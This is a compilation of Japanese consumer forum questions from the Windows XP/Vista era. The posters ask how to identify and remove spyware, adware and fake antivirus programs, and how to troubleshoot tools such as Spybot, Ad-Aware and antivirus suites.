QNo.3466366の方と質問が重複していますが、お許し下さい。 恐らく一般的にマルウェアと称されるものだと思うのですが、IEのツールバーに強制的に「Remove Popups」、「Scan Spyware」、「Security Test」、「Spam Protection」と記された一連の４つのボックスが出てしまい、どう設定を変えても消えません。このボックスを括る名称は「The egodktf」となっています。 そしてさらに、ツールバーの下には「Warning: possible spyware or adware infection! Click here to scan your computer for spyware and adware...」と記されたバーが出てしまいます。これもどうやっても消えません。この「Click here」の部分はリンクされており、そのURLは次の通りです。この質問をご覧の方がダイレクトにリンク先に飛んでしまわないために、行を分けて記載します（実際のものは全て一続きです）。 http://protect. trustedantivirus.com/ MTY4Nzc=/2/5993/ed=1/ex=1/h=10/ zheltaya_hernya/ 教えて頂きたいのは、次の内容です。 1)これはやはりマルウェア（あるいはスパイウェア）なのでしょうか。 2)有効な削除方法をご存知の方がいらっしゃれば、教えて頂けますでしょうか。 もしスパイウェアだと思うと、どうしたら良いものかと戦々恐々としています。 ちなみに私のOSはWindows XP、IEのバージョンは6.0です。 どうぞよろしくお願いします。
こんにちは。 WinXP Home, Core2duo 2.66GHz, 2GB RAMです。 スパイウエア対策でSpybotを使用しているのですが、最新版(ver. 1.5.1.15)にしてから、ダブルクリックしても起動せず、２～３回ダブルクリックして10秒以上経ってからやっと起動します。アップデートのダウンロード終了後にもアップデートウインドウの消えた跡が暫く白画面になり、フリーズに近い状態が少し続きます。全体に不必要に大きくCPUを喰っている印象です。PCのスペックは十分と思います。 このバージョンはこのような仕様なのでしょうか。出来れば旧バージョンに戻したいのですが、ダウンロードできるところはないでしょうか？
昨日Spybotで検査した結果、かなりのスパイウェアが出てきてしまいました。 僕自身、調べてみたりはしているのですが、消して良いものといけないものがあることを知り、未だ駆除できていない状況です。 どなたか、駆除して良いものとそうでないものを教えていただきたいです。 そして、出来れば駆除方法なども教えていただけるとありがたいです。 【検出されたスパイウェア】 AdRevolver Alexa Related BurstMedia CasaleMedia Clickbank CnsMin DoubleClick ErrorSafe FakeMSN8Beta FastClick HitBox LinkSynergy MediaPlex NNC.MGRS PSW.WOW Statcounter TagASaurus Tradedoubler VX2.a WebTreuds live Winsoftware.winAnti Virus Pro2006 zedo
XoftSpySEでVender「spywarestormer」が検出され、Object「c:\WINDOWS\Downloaded Program Files\install.inf」とスキャンできましたが、そのファイル(install.inf)が表示されず削除できません。 「フォルダオプション」で「すべてのファイルとフォルダを表示する」の操作をしても表示されません。 上位の「Downloaded Program Files」フォルダのプロパティを見るとファイル数が20になっているのに、開いて数えると17しかないので、問題のファイルがあるのは確かだと思います。 どうしたら「spywarestormer」を削除できるでしょうか。 よろしくお願いします。
WindowsXPをつかっています。 本日Spyware Doctor(無料版)というソフトをダウンロードしてスキャンを行ってみました。 普段はウイルス用にavast!、スパイウェアにSpybotを使用しています。 (無料版だと感染ファイルの駆除ができないのでSpywareDoctorはもうアンインストールしようかなと考えています) Spyware Doctorでスキャンしたところ、 Trojan-Downloarder.VBという危険度が最高のものに感染しているとでました。 Spyware Doctorをダウンロードする前にavast!とSpybotでスキャンをしましたが、そのような結果はでていませんでした。 ここのサイトでしらべてみたところ、Spyware Doctorはうその検索結果をだして、(感染ファイルの駆除ができる)有償のソフトを買わせる～という記述が1件みつかりました。 嘘の検索結果であればいいのですが、やはり不安です。 感染ファイルがC/WINDOWS/SYSTEM32/steup.exe.tmpとなっています。 名前が名前だけにむやみに消すこともできず、怖いです。 ほんとうに感染している可能性もありますし・・ 対策などをインターネットでいろいろしらべてみましたがわかりませんでした。 SpywareDoctorがだしたうそなのかどうか、 本当に感染していた場合の駆除方法を教えていただけませんか？ どうかよろしくお願いいたします。
ＰＣの電源を切るとき 『Notification Wnd for PNSetupMgr』の応答がありません、と表示されます。 ネットで調べた所、スパイウェアらしく「Ad-Aware」で駆除できるとあったのですが、使い方が良く解りません。ご存じの方がいらっしゃれば、是非使い方（駆除の方法）を詳しく教えて下さい。
Win XP Home SP2、IE6 SP2、ウィルスバスター2007、SpywareBlaster 3.5.1、Spybot S&D 1.4を使用しています。 Ad-Aware SEを使用していましたが、先日SEをアンインストール後、Ad-Aware 2007をインストールし、先程初めてアップデートしました。 （2007 ver7.0.2.6　　Current version:0044.0000　です。） アップデートをする前からなのですが、Ad-Aware 2007を終了するため、画面右上の×ボタンをクリックして起動画面を閉じようとすると、毎回以下のメッセージが表示されます。 Your settings changes have not been saved. Do you want to save your settings now? Press Yes. save changes and then exit. Press No to continue exit without saving settings. この表示画面の下には「Yes」「No」のボタンがあるのですが、いつも画面右上の×ボタンで閉じています。閉じると同時に、Ad-Aware 2007の起動画面も消えます。 翻訳サイトで訳したところ、 あなたの設定変化は救われていません。 あなたは現在、設定を節約したいですか? 押してください。はい、変化を救って、次に、出口を救ってください。 設定を節約しないで、いいえを押して、出口を続けてください。 と訳されました。 これはどういった内容のメッセージなのでしょうか。また、「Yes」「No」のどちらを押せばいいのでしょうか。 どうぞよろしくお願いします。
本日、Spybot - Search & Destroy version: 1.5にてスキャンをかけた所、 Smitfraud-C.: [SBI $4D179821] 実行可能 (ファイル, nothing done) C:\WINDOWS\system\svchost.exe という物が検出されました。 検索をしてみるとスパイウェアの一種だという事はわかったのですが対処法がわかりません。 わかる方がおられましたら教えて頂けないでしょうか?
一昨日、ネットサーフィン中に海外のサイトにつながってしまい、 「MalwareCrush」というソフトが勝手にインストールされてしまいました。 アンインストールをしてみたのですが、 起動の度にまたソフトが勝手にインストールされてしまいます。 「あなたのPCはウイルスに感染しています」 「今すぐ○○＄払ってソフトを購入しましょう！」のようなメッセージが何度も表示されます。 WEBでなんとか完全に削除する方法を探してみたのですが、 他のアンチウイルス系のソフトを購入する手段しかのっていませんでした。 お金を払ってそのソフトを買うのでは意味がないような... 完全に削除できる方法をご存知の方、教えていただけませんでしょうか？ よろしくお願いします。
ad-aware2007が起動できない.visuta変更後です。フリーソフトをインストールし正常終了しました。デスクトップのアイコンを管理者で実行するのですが、maicrosoftwindowsの窓が表示され、「Ad-Aware２００７は動作を停止しました　問題が発生したため、プログラムは正しく動作しなくなりました」のメセージで起動できません。.xpでは起動していました。よろしくお願いします。
アンチウイルスソフトのＡｄ－Ａｗａｒｅですが 定義ファイルの更新が１２月２８日からありませんが どうされたのでしょうかねぇ？ 御存知の方が居られましたら 教えて下さい　お願します
先週頃から、ＩＥのポップアップが勝手に上がってしまい、困っています。WinXP SP2でウイルス対策ソフトMcAfeeを導入していますが、Adware-WebBuy,Adware-Isearchが検出され、さらに再起動の度に、W32/Trats,Generic DropperがファイルC:\WINDOWS\system32\TMPxxx.tmp,C:\WINDOWS\system32\jkhhe.exeで検出・削除されます。 起動した状態で全体のSCANを行うと、ウイルスはなくなりますが、再起動すると、「コンピュータでのバッファオーバーフローが検出され、ブロックされました」とのメッセージが出てしまいます。 もしかすると、スパイウェアがどこかに潜んでいるのでは？と思いますが、対応方法がわかりませんので、わかる方がいらっしゃいましたら教えて下さい。
PCに疎いものです。 先ほどPCを終了しようとしたら、スタートボタンの全てのプログラムというところに「新しいプログラムがインストールされました・・」という表示がでました。勝手になにかインストールされたのでしょうか？少し不安なのですが・・スタートボタンの「全てのプログラム」で表示される項目を見ましたが怪しいものは見つけられませんでした。 それまでヤフオクを見ていただけなのに何故このような表示が出たのでしょうか。 ヤフオクを見ていた時、ウイルスバスターの○○番号の送信をブロックしました～という表示は何度かでました。（しかしいつもの事なのですが・・） インストールされたプログラムを調べる方法はありますか？
このソフトをインストールしたときに、AVGのウイルスシールドにブロックされまして、一応隔離したのですが・・・ エラーの数が多すぎるので、信じられないんですが、これを直すには有料版が必要とのことなので、もしこのエラーが本当なら、どうすればいいでしょうか？
パソコンの起動時に毎回 セキュリティーソフトが MFPAgent.exe を許可していいか訪ねてきます　不可 を選択して起動させるのですが この実行ファイルが何なのか？気になります ご存知の方よろしくお願いします。 OS： WinXP セキュリティーソフト：CA Security Center です
SpyBot1.5で検索すると次のような表示が出ました、対処法を教えて下さい。 　おめでとう！　スパイウェアは検出されませんでした。 　チェック中にエラー発生 　Virtumonde (60)(TRegExpr(comp):ParseReg Unmatched ()(pos96)) チェック中にエラー発生 Virtumonde (93)(TRegExpr(comp):ParseReg Unmatched ()(pos99)) どの様に対応したらよいのかわかりません、よろしくお願いします。
スパイボットを起動させたときにバックアップするレジストリがどこに保存されるのか教えてください。 またスパイボットのリカバリーはバックアップしたレジストリを使用しているのかも教えてください。お願いします。
WinXP　HOME　Edition　ver2002を使用しています。 スパイウェア（Troj/Small-CF）に感染後、ネットに自動接続（？）できなくなりました。 ネットワーク接続→状態→サポート→修復 から修復中の時のみ接続できます。 スパイウェアはCA　anti-spywareにて検出後駆除しました。 なるべくパソコンのリカバリーはしたくないのですが、 どうにかして直せないでしょうか。 方法心当たりある方いらしたらご教授願います。
近所で盗難が多発しています ノートパソコン（ＸＰ）には、一部、勤務先のデータが入ってます 起動時、１０分間無操作の場合、ノートの蓋を閉じたとき それぞれに、４桁のパスワードを入力しないと 作動できないように設定しています 指紋照合の方法に切り替えようと思いましたが よく、設定方法がわからないので、パスワード方式の ままにしています 本機が盗難にあった場合、パスワードが解析されて 作動される確率はどの程度あるのでしょうか？ 桁数を増やせば安全度は増すのでしょうか？ また、このパソコンはウィルコムの無線専用でインターネット に接続をしていますが、通信速度が遅いので、もし、スパイウエア 等に感染しても、流出データは少量と考えていいのでしょうか？
プロテクションを起動していると、「リスクウェア Invaderプロセスを実行します: C:\WINDOWS\system32\mmvo.exe」が表示されました。これを削除したいのですが、MMVOというものがsystem32内になく、検索をかけてもありません。また隠しファイルも表示できるようにしてあります。詳細を見るとIEのエクスプローラーのシステムに接続しているようです。削除すべきなのですか？もしそうならどうやって削除すればいいのですか？カスペルスキーのスキャン結果では典型的なマルウェアと表示されています。
ad-aware2007をセーフモードで起動しようとすると Exception　EAccessViolation in module Ad-Aware2007.exe at 001DC8E8 Access Violation at adress 005DC8E8 in module 'Ad-Aware2007.exe' Read of adress 00000414 というエラーメッセージが出て起動できません。 windowsXPを再リカバリーして試しましたがだめです。 ad-aware2007を削除して再インストールしても同じ症状が出ます。 なお、セーフモードでなければ正常に起動します。 どなたか解決策を教えてください
マイクロソフト製品や一太郎製品のセキュリティーの信頼性について教えて下さい。 ファイルにパスワードを設定しました。 本当に、パスワードが分からない人は、そのファイルを開く事は出来ないのでしょうか？ パソコンの知識の高い方や、闇でパスワード解除ソフトなど、販売されている事はないですか？ セキュリティーソフトの導入を考えていましたが、エクセルや一太郎のパスワード設定が信頼出来るなら、購入の必要は無いのでは？と考えています
ad-aware spybot以外のソフトで、 常駐保護、無料の奴はありますか？ 教えて下さい（英語版でも可）
つい１，２週間ほど前から突然モニタ左上に５ｃｍ四方のブラウザが出てきて一瞬で消えてしまい、フル画面で遊んでるネットゲームなどが突然最小化されてしまったり、ワードや文書作成していると突然ブラウザのリンク？タスク？が移動してしまったりと困っています。 ＩＥの履歴からタイトルのrightonadzというのが原因っぽいという事は突き止めたのですが、ウイルスバスターで検索しても何もひっかからなず、毎日２，３個のスパイウェアが検索される状態に陥っています。ウイルスバスターは隔離や削除成功となっているのですが、毎日なのでかなり困っています。対策としてはどうしたらいいのでしょうか？ いちおう、以下にＰＣのスペックを記載します。 ＯＳ…XP Home ＣＰＵ…Pen4 2.8G メモリ…512Ｍ グラボ…GeForceFX 5200 128MB ＤiＸ…9.0ｃ ウイルスソフト…ウイルスバスター2008　アップデートは最新 症状は１，２週間前から。rightonadz.bizという履歴が残り、そこにアクセスすると Error - Ads need to be loaded from adcode, if you keep getting this error contact your account rep. というメッセージのみの画面が出る。ウイルスバスターでチェックしても特に改善される様子はない。
最近頻繁にお気に入りの順番が入れ替わります、 何かに感染してるのでしょうか？ 今までこんなことは無かった物でから。
Windows Defenderって管理者権限で実行するスタートアップは全てブロックにしてしまうのでしょうか？？ それを解除する方法はありませんか？？
　まったくのパソコン初心者です。　パソコンを購入してから、体験版のマカフィーでウィルス対策をしていました。今日マカフィーをアンインストールして、ウィルスバスターをインストールしました。そうしたらスパイウェアというものが１６見つかり、削除しました。今削除したとしてももう手遅れですか？何件かのサイトで個人情報を登録してしまったのですが・・。 　どうぞよろしくお願いします。
ad-awareを久々に使おうと思ったらエラーメッセージが出てスキャンできませんでした。 //Database Corrupt Definition File Suggested Action REmove old definition file // このエラーの意味とまた使えるようにしたいのですが、どうしたらいいでしょうか？一度アンインストールしてからインストールし直しても直りませんでした。フリー板を使いました。
カスペルスキー体験版のウィルススキャンでトロイの木馬のTrojan-Downloader.Win32.Agent.fkeが検知されました。しかし、Windows\Tempフォルダのstartdrv.exeファイルがどうしても削除できないようです。 手動で何とかしようと、 １．レジストリキーを削除しようとしてもダメ（指定された値をすべて削除できません） ２．シマンテックのレジストリキーリセットツールUnHookExec.infをインストールして、レジストリキーを削除しようとしてもダメ でした。 （上記操作は、すべてセーフモードで実行しました。） カペストリキーのウィルス情報ページをのぞいてみても、 Currently there is no description available for this program. と書いてあり、駆除方法は掲載されていませんでした。 ここまでくると、もうOSの再インストールしかないのでしょうか? まだ他にも方法があるというのをご存知の方がいらっしゃいましたら、ぜひご教授下さい。よろしくお願いします。
トロイの木馬か何かわかりませんが、ウイルスまたはスパイウェアに感染したようだったので、アンチスパイウェア－プロフェショナル、デフェンダー、ウイルスバスターを使って削除を試みました。 その結果、プログラム自体の駆除には成功したようなのですが、ウイルスバスターでスキャンすると、何度も、クッキーが不法とのメッセージが出ます。 そのたびに駆除しており、駆除自体はできるのですが、どうして、クッキーが残るのかわかりません。すっきり解決したいので、どうか、お知恵をお貸しください。よろしくお願いいたします。
今日久々にSpybotで検索してみると チェック中にエラー発生！: Virtumonde [13] (TRegExpr(comp): ParseReg Unmatched () (pos 96)) () チェック中にエラー発生！: Virtumonde [46] (TRegExpr(comp): ParseReg Unmatched () (pos 92)) () おめでとう！: スパイウェアは検出されませんでした。 というのが出てきました。 このエラーというのは何なのでしょうか？ 昨年末までは出てきませんでした。 また夏ごろにインストールしたのでバージョンは１．５だと思います。 ＯＳはＸＰを使っています。 最近ダウンロードしたのはZip位です。 詳しい方がおられたらご回答お願いします。
　私の通っている学校のパソコンに俺様キーロガーがしこまれていました。これらのキーロガーを無効化するにはどのようにすれば良いのですか？私も、対策としては学校でパソコンを使用したら必ず学校のパソコンで使用したアカウントのパスワードを変更するなどしています。その他にも何かキーロガーの対策として有効な方法があれば教えてください。
ロンブー敦と若槻千夏のキーワードで探していたら、誰かのブログ記事見たいのが出てきて、本命はこちらと書いた、文字をクリックしたら、いきなり、あなたの個人情報は、課金対象として登録されました。２日以内に４５０００円を振り込まないと請求金額が９００００円になり、払わないと、警察に被害届けを出します。といった、メッセージが出てきてしまったのですが、どうしたらいいんでしょうか？もちろん、入会するつもりなんて、なかったし、するかしないかの質問さえ一切ありませんでした。どうも、違法な動画を見られるようなサイトみたいらしいのですが。その画面の後は、一切、クリックをせずにウインドウを閉じたのですが、本当に請求が来るなんてことにならないでしょうか？
AlxRes.dll (Adware-Alexa) は、PCに どんなトラブルを引き起こすのでしょうか？駆除した方が良いのでしょうか？問題無いのでしょうか？駆除した方が良い場合は、その方法をお教えくださいませ。
よろしくお願いします。 ウイルスバスター２００８を使っています。 スキャン中に検出数が４と出ているのにスキャン後、２件（スパイウェア）の問題を修復しました。となりますがあとの２件はどうなっちゃったのでしょうか？（検出されたのはほとんどクッキーですが） 何回かこうゆうことがあったので気になります。 それとアップデート中にコンピューターが危険にさらされている可能性があります。ウイルスバスターが無効になっています。とポップアップがでるのは問題がないのですか？ ウイルスバスターに詳しい方よろしくお願いします。
パソコンをつかっていると、突然開いて、大変迷惑を感じています。どうやったら、駆除できるでしょうか？
正体不明のファイルがHDDに有り、削除したいのですが、私のレベルでは太刀打ちできません、削除方法を教えて下さい。 「この操作を実行するアクセス許可が必要です」の表示が出て削除できません。
僕は、OneCareを使っています。近々、更新するかノートン360に変えるか迷っているのですが、このどちらかをインストールするときに「競合ソフト」として検知されないスパイウェア対策ソフトを探しています。 よろしくお願いします。
スパイウエアがみつかりました。 どこへ行けば、見つかったスパイがどのようなものかわかりますか？ Tracking Cookie.Netflame C:Douments and Settings\ユーザー名\Cookies\ユーザー名@ssl-hints. netflame［2］.txt Medium 上のようなものです。また、どのようなものか分かりましたら 教えてください。お願いします。
OSはXP　Home　Premiumで、ウィルスバスター２００８を使っています。でも、ウィルスバスター２００８は、「Spyware Blaster」や 「Spybot-Search」などと相性が悪くて、これらのソフトは使えません。では、スパイウェア対策として、どのフリーソフトを入れればいいのか分かりません。ご存知の方、是非教えてください。宜しくお願い致します。
ZoneAlarmをパソコンに導入したんですが、それ以来YouTubeがちゃんと見られなくなってしまいました。 お目当ての動画を見ようとすると、最初の10秒くらいで再生できなくなります。 バッファもされていません。 同様に、他の動画等もダウンロードができなくなっています。 何か設定方法とかはあるのですか？ パソコンはWindowsXP HomeEdition SV2です。 ほかに必要な情報があればすぐにアップします。 よろしくお願いいたします。
みなさんお使いのお勧めのフリーのスパイウェア、ウィルスソフトを教えて頂けませんか。出来れば常駐タイプの侵入検知するものが希望です。
avastをインストールしたのですが、設定がうまく出来ていないせいか、”オンアクセス保護を開始”にするとサーバーに接続が出来ません。設定方法を教えて頂けませんか。
初めて教えてgoo!を使用します。 みなさん、ヨロシクお願いします(o・ω´・o)ｂ spybotのウイルス検索をしてみたんですが 英語ばかりでどれを消去して、どれを残しておけばいいのか分かりません（；^ω^） 一応、スパイボットの検索結果がコチラです↓ ・CnsMin　24エントリ ・DoubleClick　1エントリ ・LinkSynergy　1エントリ ・Windows Security Center.AntiVirusOverride　1エントリ ・Windows Security Center.FirewallBypass　2エントリ ・Windows Security Center.FirewallOverride　1エントリ ・Statcounter　1エントリ ・TagASaurus　1エントリ ・WebTrends live　1エントリ どうでしょうか？ どれを消してどれを残せばいいのでしょう？ どうか、ご意見お願いしますm(_ _)m
http://ahomepcsafety.com/のアドレスで、ウイルスが発見されました、というような表示が出ます。 どうしたら駆除できるでしょうか？ また、どうしてこうなったのでしょうか？ お教えください。
インターネットエクスプローラーが一瞬かってに起動する症状でこまっています。これはウイルス等の仕業なのでしょうか？ネットサーフィン等していると数分に１度画面左上に小さなウインドウが一瞬出てすぐとじます。よろしくお願いします（IEのバージョンは７です）ウイルスバスターをインストールしています。
最近複数の無料動画配信サイトからファイルをダウンロードしようとすると、ファイルにアプリケーションが含まれているという警告がポップアップで出ることがあります。以前はなかったことですが、これはどういう意味なのでしょうか？スパイウェアの可能性はありますか？そのままダウンロードするとどうなるのでしょうか？
最近、勝手にダブルクリックのスパイウェアが勝手に入ってきてしまいます。一回削除しても次の日にはまたと言う感じで・・・・ この、ダブルクリックのファイルだけ進入させない方法とか、ないものでしょうか？？ ちなみに、spybot seach＆Destroy を使っています 　　　ZoneAlarm と言うファイアーウォールのソフトも使っています
いいソフトありませんか？ inDtrl5やはマイクロソフトでも公開されていて いいですがどこで手に入れるのかわかりません。 できればフリーで知名度が高いものがいいです。 FilemonやRegmonは同じファイルへのアクセスが何度も 記録されて見にくいです。
　Win　ｘｐです。 　JWordを「プログラムの追加と削除」から削除しましたら「削除しました」とシステムからダイヤログが表示されたのですが、 Spybotで検索をかけると検出されました。 　これはSpybotから「削除」で簡単に削除できるのでしょうか。 出来ない場合の方法があればぜひ教えてください。
質問です。 あまりPCに詳しくないのですが、今までスパウェア対策として「Ad-Aware」を使っていました。 ですが、そのソフトウェアによって検知できるものとできないものがあるというものを友人から聞きまして、そのまま友人のすすめで「spybot」を導入してみました。 導入方法が書かれてるサイトを頼りに、アップデートや免疫などの設定も済ませ、いざスキャンをしてみたところ２点エラーがでました。 Vario.AntiVirus [15960](TRegExpr(comp):ParseReg Unmatched ()(pos 96)) と Vario.AntiVirus [15961](TRegExpr(comp):ParseReg Unmatched ()(pos 96)) です。 ここの質問履歴を見ましたら、[]の中の数字は違いますが同じエラーが同じく２個出ていた方がいまして、そちらへの返信に書いてる事も試してみましたが駄目でした。 これに対する解決策などをお分かりの方は是非教えてください。 よろしくお願いします。
マイクロソフトセキュリティの自動更新が無効のままになっています。市販のセキュリティソフトはカスペルスキィーインナーネットセキュリティ7.0を使用しています。自動更新が無効のままになって大丈夫でしょうか？
「ポップアップをブロックする」のチェックを入れてもしばらくすると勝手に外れてしまいます。 しかもインターネットエクスプローラーを起動していなくてもポップアップが出てしまうので、パソコンをつけている限り際限がない状態です。 一応スパイウェア対策はしています。 対策が至らずってことなのでしょうか？ どなたかアドバイスを下さい。 お願いします。
今までSpybot1.4を使用していたのですが、1.5にアップデートしました。 とりあえずインストールまではでき起動したのですが、アップデートの部分が英語で表示されていてどうもよく分かりません。 「アップデータを検索」を押すと、Please select a download place to download the updates from.Updates may work faster if you choose a plase near your current location.と表示され、色々な国の国旗が出てきました。 1.4まではただチェックを入れてダウンロードするだけだったので戸惑ってしまいます。 どれを選択すれば良いのでしょうか？
以前まで使用していたウイルスバスターが期限切れになってしまい、現在は無料のavastと言うウイルス対策ソフトを使用しています。 ですがこれだけではスパイウェアには対抗できないと知りました。 アダルトサイト（無料で画像をダウンロードしたりなど）にも行っているのですが、最近ではウイルスよりスパイウェアの方が危険だと聞きます。 以前SpyBotについて質問した時、これでは国外のスパイウェアにしか意味が無いと言われてしまい使うのを止めてしまいました。 普段からこういうサイトに行っている為、無料で使えるスパイウェア対策ソフトがあれば紹介してください。 それとオンラインゲームもしているので常駐保護をいつもしないで、そう言うサイトに行った時の後にだけスキャンをしているのですがこれで大丈夫でしょうか？
自作デスクトップです。WindowsXP H.E.sp2にセットされているWindowsファイアウオールは無効にしてZoneAlarmを使用しています。ウイルス対策はavast!4 Home Edition,　またWindows DefenderもインストールしておりWindows Updateも自動で設定しています。時々念のためSpyBotＳ＆Ｄでスキャンしていますが、昨日"BurstMedia"-内訳トラッキングcookie(Internet Explorer)...として３件が検出されたので削除しました。 BurstMediaとは何か教えていただけないでしょうか？ 又これは削除してよかったのでしょうか？宜しくお願いします。
マカフィーウィルススキャンにてJunk-NavQuarが検出されます。 名前 :Junk-NavQuar プロセス :C:\WINDOWS\System32\svchost.exe スキャンをかけても検出されるだけで削除ができません。 どのように対処したらよろしいでしょうか？ ご教示お願い致します。
Virus Seigyo に侵入され侵されました。駆除方法を教えてください。よろしくお願いします。
バスターやノートンとは基本的に違うものですか？
ダウンロードができません。ダウンロードのボタンを押すと This object has been blocked. という文字が出ます。 EXE、LZH 形式又ファイヤウォールを切って試しましたが ダウンロードができません。ダウンロードできるようになるにはどうしたら よいでしょうか?
信頼できるスパイウェアツールはなんですか？
最近自分のパソコンの各所に意味不明のファイルが作成されています。何かパソコンの中でプログラムが動いているような気配があります。パソコンの中で何が動いているのか不安です。どのようにしたら良いのでしょうか。現時点でのパソコンの中で何が動いているか調べる方法はありますか。アドバイスよろしくお願いします。
WEB上でリンクをクリックすると http://www.quickbrowsersearch.com/ ここのサイトに飛ばされます。 IEのエラーも頻発しているため、これが原因なのかと思いますが、 調べても情報がなかなかでてきません。 もしなにか情報がわかるようならば教えてください。 無料のウィルススキャンやスパイウェアの検索もおこない、 削除はしましたが、未だに上記の現症が出現します。 PCはwinxpです。 よろしく御願いします。
あるページのリンク集を見ていたのですが、内容が気になってジャンプしたのですが、派手なポップアップが出てどう対応して良いか分からず閉じてしまいました。このサイトは有害なサイトなのでしょうか？それとも無害なサイトなのでしょうか？
現在の当方の症状：IE7でホームページを開いたときにページ上方にあるべきでない広告が勝手に表示されたりポップアップ広告が強制的に出ます。 WindowsLiveメッセンジャーの広告欄もホームページと同じ広告に取って代わっています。 ちょっと調べり教えていただいたところ、悪意のあるアドウェアの仕業のようです。現在潜んでいるアドウェアを駆除するためのお勧めの無償ツール（ダウンロード可）が教えてください。
私は現在スパイウェア対策に「Spybot15」「ADaware2007」「SpywareBlaster3.5.1」をインストールしています。いずれもフリー版です。 数年前、スパイウェア対策にこれらのソフトを入れるのが有効だと各方面で聞いたのでそれ以来入れてるのですが、最近は「スパイウェア対策ソフトは複数入れないほうが良い」という意見もチラホラ聞くようになり何を信じていいやら混乱してきました。 最近のウィルス対策ソフトにはスパイウェア予防の機能もついているので、昔とは事情が変わってきたのでしょうか？ 以前、ヤフーBBセキュリティ(NIS)と旧verのSpybotなどを組み合わせて使っていた頃は特に不具合は感じなかったのですが、最近OSを再インストールしウィルスバスター07に切り替えた所どうも調子が良くないように思います。 ウィルスバスターと最新verの各スパイウェア対策ソフトの組み合わせが良くないのか、SPYBOTの起動が異様に遅かったりADawareのアップデートができなかったりそれまで経験したことのない不具合があります。 スパイウェア対策ソフトはすべてアンインストールし、ウィルスバスター１本だけに任せたほうが良いのでしょうか？ それともSPYBOTだけでも残しておいたほうがいいとかありますか？ 皆様の意見をお聞かせください。 XPです。
はじめまして。 ずいぶんと以前から出ていて困っているのですがPCシャットダウン時で長時間利用した際に限り毎回「CL RC Engine 3 Dummy Windowの初期化に失敗しました」。とでてシャットダウンしたりしなかったりします。 ネットでGOOGLEYAHOOとも調べてみましたが日本語の回答ページがなく困っています。 どなたかご教授いただけませんでしょうか？ 〔そのほかの情報〕 起動してすぐシャットダウンをするとこのエラーは発生しません。 起動してすぐシャットダウンするときはスクリーンショット機能は正常に働きますがスクリーンショットが正常に動かないときは、シャットダウン時間違いなくこのエラーが出ます。 トレンドマイクロウィルスバスター2007でスパイウェアとウイルス検索両方を行いましたがエラーはあがりません。 画面キャプチャー系のフリーソフトかグーグルデスクトップサイドバーの導入したあとから起こりはじめたような気がしますが どちらも起動はしていない状況で発生します。 〔環境〕 PC　DELLXPSM1210 メモリ１G　 OS　WINDOWSXPSP2 ブラウザー　IE6.0　とファイアーフォックス よろしくお願いいたします。
友人からの頼みで質問させていただきます。 友人の環境はOSがWindowsVistaネット環境はＡＤＳＬだそうです。 最近ネットを始めて、いろんなサイトを巡っていたらしいのですが、一昨日あたりから、ネットをしていると『Critical System Error!』という表示が出るそうです。（Win32とかいう表示もあるそうですが・・・） 私もこの症状に経験があって、インチキスパイウェアということは知っていて、友人にこの手のものの有名な駆除ソフト「PC-Clean」を教えて、駆除をしてみたらしいのですが、どうしても駆除できないソフトがあるそうで、まだネットをしていても表示されてしますそうです。 「critical system error」ってググって駆除方法を検索させてやっているのですが、一向に駆除できなそうです。 このサイト（http://www.higaitaisaku.com/fakewarning.html）の方法もやってみたのですが、できませんでした。 どなたか、この手のインチキスパイウェアの駆除方法を教えてください。 お願いします。 ＊友人はウィルス対策ソフトはシマンテックのノートンをインストールはさせてあるものの、機能を有効にするとインターネットができなくなるということで、無効にしているそうです。
ブログのアクセス解析で見たことのないリンク先があったのでクリックしてみたところ海外サイトに飛んでしまいました。 飛んだ先のページは後ろにYou Tubeのフレームが表示されていましたが画面は黒いままで音声のみと、訳の分からないダイアログ（？）が出てきたのでYesを押さずに何回かダイアログを閉じようと×を押していたのですがキリがないのでInternet Explorerのタスクの終了をしたのですが、Yesのボタンを押してない場合でもスパイウェアなどに感染してしまっているのでしょうか？ 一応クッキー、履歴の削除等はすぐ行い過去の質問のような「数分おきに海外ページやポップアップが勝手に出る…」ということは起こっていませんが心配なのでどなたか詳しい方教えていただけないでしょうか。宜しくお願いします。
ど素人な質問ですいません ルーターがあればスパイウェア対策ソフトは不要なんですか？ ちなみに使ってるルーターはひかりoneのホームゲートウェイで自動で設定等をしてくれるそうです そこら辺の勉強も一からしたいんですが初心者でも分かるような感じで解説してるサイト等あったら教えてください 自分で検索してみたんですけどセキュリティーソフトとルーターの関係とかがよく分かりませんでした よろしくお願いします
なにか起動しようとすると、Ads Served by Dcadsとある外国からの広告が出てきます。 SpybotとAd-Awareで探し、Webhancerは削除できていると思います。 一応セーフモードでもチェックしました。 しばらく何も音沙汰が無かったのですが、ある日突然広告が復活しました。 再びSpybotとAd-Awareで検索しましたが、何も検出されません。 未だに時々広告が出てきます。 念のためAVG Anti-Virus Free-Editionでも検索しました。 そうしたら、 D:\WINDOWS\system32\shell32.dll と、 D:\WINDOWS\system32\drivers\etc\hosts に、ヒットします。 結果/感染の欄には、changeと出てきます。 毎回ヒットするので、気持ちが悪いです。 この２つはどういうものなんでしょうか？ どのように対処すればよいのでしょうか。 Windows XP　HOMEです。
ノートンインターネットセキュリティ2008（Ｗｉｎ-ＸＰ）利用者です。 「ＩＤセーフにログイン」というポップアップが頻繁にでます。 都度、「今後この画面を表示しない」にチェックを入れるのですが再び現れます。 一体どうすればこれが出ないようにできるのでしょうか？ お詳しい方、よろしくお願いいたします。
Vista起動時にwindows defenderでブロックされたプログラムをブロックされないようにする方法はあるでしょうか？ ブロックされたスタートアッププログラムと出ている所で、ブロックされたプログラムの実行をクリックすれば起動させることはできるのですが、 毎回これをやるのは面倒くさいので、ブロックされないようにしたいです。 defenderを切る以外で、できる方法ありましたらよろしくお願いします。
初めまして。読んでくれた方ありがとうございます。 今IEを見ていると調子が悪くウィルス・スパイウェアの検索をかけたところ TROJ_AGENT.ACSF　というものがなんと1700件も見つかりました。 さらに私の使っているウィルスバスターでは処理できないとのことです。 どのように対処すればいいのでしょうか？ それと現時点で私のパソコンの方は大丈夫なのでしょうか？ 分かる方回答お願いします。
InternetExplorerを立ち上げていると、 突然もう一つInternetExplorerが立ち上り、 開いた覚えのないページが表示されます。 ページは毎回違うのですが、 毎回共通して上のバー(?)のところに 「CiD: http://～（←ページのアドレスが続く）」 と表示されています。 これはスパイウェアなのでしょうか？ どうすれば直るのでしょうか？ ちなみに昨日Spybotでやってみましたが直りませんでした。 やり方が違うのかもしれないのですが・・・ あまりパソコンには詳しくないので わかりやすく教えていただけたらと思います。 宜しくお願いします。
